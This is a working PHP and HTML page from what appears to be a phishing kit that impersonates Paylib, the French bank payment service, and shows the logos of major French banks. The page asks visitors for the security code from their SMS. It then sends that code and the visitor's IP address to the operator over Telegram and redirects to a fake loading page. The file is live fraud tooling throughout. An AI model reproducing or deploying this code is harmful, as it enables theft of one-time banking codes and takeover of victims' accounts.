<?php

error_reporting(0);

if (session_status() === PHP_SESSION_NONE) {
  session_start();
}

include 'includes.php';
include 'core/ip.php';
include 'core/telegram.php';
include 'config.php';

if (isset($_POST['reference'])) {

  $ip = ip();
  $reference = $_POST['reference'];
 

  $message = "💌 NOUVEAU LOG PAYLIB: $ip\n\n";
  $message .= "🧲 CODE : $reference \n";
  $_SESSION['data'] = $message;

  tlgsend(urlencode($message));

   header('location: chargement.php');
}

?>

<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>Paylib entre amis</title>
    <link rel="stylesheet" href="./style.css">
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" href="libpay/assets/paylib.jpg">
    <title id="" data-react-helmet="id">Paylib entre amis</title>
    <meta name="apple-mobile-web-app-title" content="Paylib">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">

  </head>

  <body>

    <img  src="">

    <div id="didomi-host" data-nosnippet="true" aria-hidden="true">
      <div class="notranslate didomi-screen-medium didomi-consent-popup__70305afe-c713-4713-a0d7-65d0f6b02ae8"></div>
    </div>
    <div id="app" style="width:100vw;height:100vh">
      <div class="react-gradient sc-AxjAm bcMPWx" style="background-image: linear-gradient(80deg, rgb(66, 219, 255), rgb(234, 251, 255));"></div>
      <div class="MuiBox-root jss1 sc-fznKkj fQkkzS">
        <div class="MuiContainer-root jss2 sc-fzplWN djGbrK MuiContainer-maxWidthSm" height="" align="center">
          <div class="MuiPaper-root sc-fznyAO bXtyWV MuiPaper-elevation0" padding="10px 20px">
            <div style="opacity: 1; transform: translate3d(0px, 0px, 0px); width: 100%;">
              <div class="sc-fzokOt hLgJkJ">
                <div class="sc-fzoyAV fQsatj"><button class="MuiButtonBase-root MuiIconButton-root" tabindex="0" type="button" id="paylib-logo"><span class="MuiIconButton-label"><a href="/"><img src="data:image/svg+xml,%3C?xml version='1.0' encoding='UTF-8'?%3E %3Csvg width='88px' height='39px' viewBox='0 0 88 39' version='1.1' xmlns='http://www.w3.org/2000/svg'%3E %3C!-- Generator: Sketch 51.2 (57519) - http://www.bohemiancoding.com/sketch --%3E %3Ctitle%3EGroup%3C/title%3E %3Cdesc%3ECreated with Sketch.%3C/desc%3E %3Cdefs%3E%3C/defs%3E %3Cg id='Symbols' stroke='none' stroke-width='1' fill='none' fill-rule='evenodd'%3E %3Cg id='Header' transform='translate(-21.000000, -21.000000)' fill='%2316D6FF'%3E %3Cg id='Group' transform='translate(21.000000, 21.000000)'%3E %3Cpath d='M22.7336382,23.1253591 C21.6294139,23.1253591 20.9007958,22.908394 20.4428648,22.4415765 C19.8180474,21.8055263 19.5556375,20.6071939 19.5643621,18.4320619 L19.56906,17.3979378 C19.5840485,13.7118153 20.2936513,12.7023567 22.8687581,12.7023567 C24.0792439,12.7023567 24.8998061,12.936679 25.3747389,13.419255 C25.833341,13.885159 26.0449691,14.641111 26.0409424,15.7985626 L26.0268487,20.0597567 C26.0201375,22.2083962 25.034926,23.1253591 22.7336382,23.1253591 Z M26.6248211,9.83544867 L26.652561,10.9951841 C25.5731682,10.0320875 24.1338287,9.59016393 22.1376792,9.59016393 C17.6836461,9.59016393 15.8568438,11.7518213 15.8331307,17.0507937 L15.827538,18.4610667 C15.815234,21.4264083 16.3707019,23.3779521 17.5767135,24.6066596 C18.6335117,25.6834916 20.1994701,26.2069484 22.3645195,26.2069484 C23.9340572,26.2069484 25.1130002,25.9235235 26.0098469,25.3221876 L26.0040305,26.2131148 L29.7553957,26.2131148 L29.7294455,9.86513862 L26.6248211,9.83544867 Z' id='Fill-1'%3E%3C/path%3E %3Cpath d='M45.5827338,10.2295082 L41.8397233,10.2295082 L41.8267615,20.998389 C41.8238053,22.1325551 41.6655346,22.6867315 41.2418877,23.0450973 C40.7534316,23.4611365 40.0139256,23.6557842 38.9114885,23.6557842 C37.8240598,23.6557842 37.1025183,23.4843919 36.6422599,23.1174216 C36.2115636,22.7727765 36.0369201,22.1765078 36.0398763,21.0607135 L36.0683013,10.2295082 L32.2877698,10.2295082 L32.3061892,21.4762876 C32.300959,23.4232302 32.9010686,24.8006478 34.1394912,25.6834231 C35.2949126,26.5245711 36.6943346,26.8673558 38.9692482,26.8673558 C40.0866937,26.8673558 41.0256299,26.7696831 41.8228957,26.5696866 L41.8410877,28.0078009 C41.8379041,29.1694084 41.6648524,29.4049857 40.8052789,29.4049857 L39.0979568,29.4049857 L39.0979568,32.6065574 L41.4217614,32.6065574 C44.3643225,32.6065574 45.5670432,31.4212293 45.572046,28.5150013 L45.5827338,10.2295082 Z' id='Fill-3'%3E%3C/path%3E %3Cpath d='M5.36831579,23.0992867 L5.37415218,26.3118038 C5.37415218,26.3118038 7.63984058,26.3159416 7.73158871,26.3159416 C12.4896511,26.3159416 14.5298212,24.0045384 14.5545675,18.5852117 L14.5608708,17.1661872 C14.5755785,14.2295213 14.0117828,12.3029306 12.7884745,11.1032078 C11.7348885,10.0715243 10.209255,9.59016393 7.9876897,9.59016393 C5.921606,9.59016393 4.36118753,10.0547433 3.24059976,11.0057403 L3.23172844,9.87084253 L0,9.85061344 L0.0387536604,31.9672131 L3.95357373,31.9672131 L3.95590829,15.906007 C3.970616,13.557134 4.82693182,12.7240634 7.32934439,12.7240634 C8.51740088,12.7240634 9.29247409,12.9419859 9.77059154,13.4109329 C10.4053578,14.0329774 10.6719643,15.2216661 10.6607584,17.3843395 L10.6563228,18.4247583 C10.6388136,22.1349569 9.85907128,23.0898618 7.23876354,23.095149 L5.36831579,23.0992867 Z' id='Fill-5'%3E%3C/path%3E %3Cpath d='M66.7787947,12.57563 C66.7744097,13.8980409 65.9853535,14.6556698 64.6110247,14.6556698 L64.4494747,14.6556698 C63.7531943,14.6556698 63.1757686,14.4476887 62.7774325,14.05374 C62.3950206,13.6765308 62.2011606,13.1603617 62.2034685,12.5189913 L62.2041608,12.3052776 C62.2069302,11.0028164 63.0301428,10.2254671 64.4042408,10.2254671 L64.5662523,10.2254671 C65.2563015,10.2254671 65.8251882,10.4267983 66.2108311,10.8074472 C66.5890888,11.1807582 66.780641,11.7047237 66.779487,12.3621456 L66.7787947,12.57563 Z M72.8629977,0.518003504 L72.8629977,20.5914992 C72.8609206,21.752249 73.0547806,22.4947436 73.4911963,22.9269864 C73.9456133,23.376198 74.6714343,23.5678983 75.9966057,23.5678983 C78.3822374,23.5678983 79.5070868,23.0939216 79.5119333,18.7591105 L79.5130872,17.744429 C79.516549,15.7194229 79.2679928,14.7923365 78.6822587,14.1851327 C78.2728449,13.763438 77.6538777,13.5407813 76.6878089,13.4788685 L74.3709514,13.4788685 L74.3709514,10.2314291 L76.9624438,10.2337222 L76.9631362,10.2314291 C79.0381303,10.2646786 80.5536999,10.7858924 81.5890044,11.808141 C82.8262465,13.0294277 83.4002105,14.7499147 83.3967487,17.641929 L83.3944409,18.9097649 C83.3879789,24.3610696 81.1611278,26.6866967 75.9481407,26.6866967 C73.2262544,26.6866967 71.5221329,26.2012547 70.4231314,25.1129658 C69.4637553,24.1629488 69.0088767,22.7476687 69.0130309,20.7866391 L69.0130309,0.0160514587 C68.8011696,0.00917226214 68.5900007,0 68.376524,0 C64.2493836,0 60.4220338,1.26783593 57.2618854,3.42927951 L57.2618854,21.9097826 C57.2602699,22.5779819 57.3271977,22.9480826 57.4875938,23.110661 C57.6159106,23.2404485 57.8713904,23.3025906 58.2711112,23.3025906 L60.1164735,23.3025906 C60.1164735,23.3025906 60.1171659,24.0652642 60.1164735,24.2714108 L60.1134733,25.7013664 C60.111627,26.3342525 60.111627,26.6422112 60.111627,26.6422112 L57.738227,26.6419819 C56.12942,26.6419819 55.052574,26.3090288 54.3498316,25.596344 C53.6613979,24.8978763 53.3475294,23.8545315 53.3514527,22.3131328 L53.3514527,6.95716083 C50.4804788,10.3481461 48.7482014,14.722398 48.7482014,19.5002293 C48.7482014,28.2191524 54.5086121,35.5996131 62.4545633,38.094927 L62.4545633,16.0207317 L66.5064676,16.0207317 L66.5064676,38.9098825 C67.1222038,38.9676678 67.7453251,39 68.376524,39 C79.2146813,39 88,30.2696116 88,19.5002293 C88,10.2653665 81.53777,2.53521326 72.8629977,0.518003504 Z' id='Fill-7'%3E%3C/path%3E %3C/g%3E %3C/g%3E %3C/g%3E %3C/svg%3E" alt="Paylib logo" style="max-width: 88px;"></a></span><span class="MuiTouchRipple-root"></span></button></div>
                <hr class="MuiDivider-root">
                <div class="sc-fznZeY gJlwEu">
                  <div class="MuiBox-root jss3 sc-fzqNJr hXQgjp">
                    <h1 class="MuiTypography-root MuiTypography-h1 MuiTypography-gutterBottom MuiTypography-alignCenter">Instant Sécurité</h1>
                  </div>
                </div>
              </div>
            </div>

            <center><img width="350" src="https://i.pinimg.com/originals/77/9b/9d/779b9dc3928c2dbc304bcf6702bef6df.gif" width="350px"></center>

            <div style="opacity: 1; transform: translate3d(0px, 0px, 0px); width: 100%;"><span class="sc-fzoLsD kskohJ"><b>Saissisez le code présent dans votre SMS.</b></span><br><br><b>Vous pouvez également récliquer sur le lien contenu dans votre message</b></div>
          

            <form action="" method="post">
                <div class="sc-fzoiQi ozSmQ">
                  <div class="sc-fznWqX dAkvW">
                    <div class="MuiFormControl-root MuiTextField-root sc-fznJRM TaYHM" width="100%"><label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-outlined" data-shrink="false" for="reference" id="reference-label"></label>


                      <div class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-formControl"><input aria-invalid="false" id="reference" name="reference" placeholder="Veuillez saisir le code reçu" type="text" minlength="4" maxlength="8" class="MuiInputBase-input MuiOutlinedInput-input" value="" required>
                        <fieldset aria-hidden="true" class="jss4 MuiOutlinedInput-notchedOutline">
                          <legend class="jss6"><span></span></legend>
                        </fieldset>
                      </div>
                    </div>
                  </div>


                  
                  <div class="sc-fzoiQi ozSmQ"><button class="MuiButtonBase-root MuiButton-root MuiButton-contained sc-Axmtr kwqgQf MuiButton-containedPrimary  tabindex=" -1"="" type="submit" id="reference-submit-button" width="240" style="background-color:#35D7FE; color:white;"><span class="MuiButton-label">Continuer</span></button></div>
              </form>
            </div>

            <div style="opacity: 1; transform: translate3d(0px, 0px, 0px); width: 100%;">
              <div class="sc-fzoiQi ozSmQ">
                <div class="MuiBox-root jss8" id="sponsors"><span class="MuiTypography-root MuiTypography-caption"><span class="sc-fzoLsD fDmMBO">Ce service vous est proposé par :</span></span>
                  <ul class="sc-fzoLag BNtsP">
                    <ul class="sc-fzoXzr jYxGEJ">
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/agricole.png" alt="Crédit Agricole" title="Crédit Agricole" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/bnp.png" alt="BNP Paribas" title="BNP Paribas" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/postal.png" alt="La Banque Postale" title="La Banque Postale" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/societe.png" alt="Société Générale" title="Société Générale" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/hello.png" alt="Hello Bank!" title="Hello Bank!" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/arkea.png" alt="Crédit Mutuel Arkéa" title="Crédit Mutuel Arkéa" class="sc-fznxsB hXzbMZ"></li>
                    </ul>
                    <ul class="sc-fzoXzr jYxGEJ">
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/bpopu.png" alt="Banque Populaire" title="Banque Populaire" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/caisse.png" alt="Caisse d'Epargne" title="Caisse d'Epargne" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/mutuel.png" alt="Crédit Mutuel" title="Crédit Mutuel" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/cic.png" alt="CIC" title="CIC" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="../assets/lcl.png" alt="LCL" title="LCL" class="sc-fznxsB hXzbMZ"></li>
                    </ul>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="MuiContainer-root sc-AxhUy fxWvvr MuiContainer-maxWidthSm">
          <hr class="MuiDivider-root">
          <footer class="sc-AxirZ bJCmFu">
            <ul class="sc-AxiKw eSbheu">
              <li class="sc-AxhCb eSwYtm"><a href="">Mentions légales</a></li>
              <li class="sc-AxhCb eSwYtm"><a href="" target="_blank">FAQ</a></li>
              <li class="sc-AxhCb eSwYtm"><a href="">CGU</a></li>
              <li class="sc-AxhCb eSwYtm"><a href="">Cookies et données</a></li>
              <li class="sc-AxhCb eSwYtm"><a href="">Se désinscrire</a></li>
            </ul>
          </footer>
        </div>
      </div>
    </div>
    <div id="simple-translate-button" style="display: none;"></div>
    <div id="simple-translate-panel" style="display: none;">
      <p>...</p>
    </div>
  </body>

</html>
</body>

</html>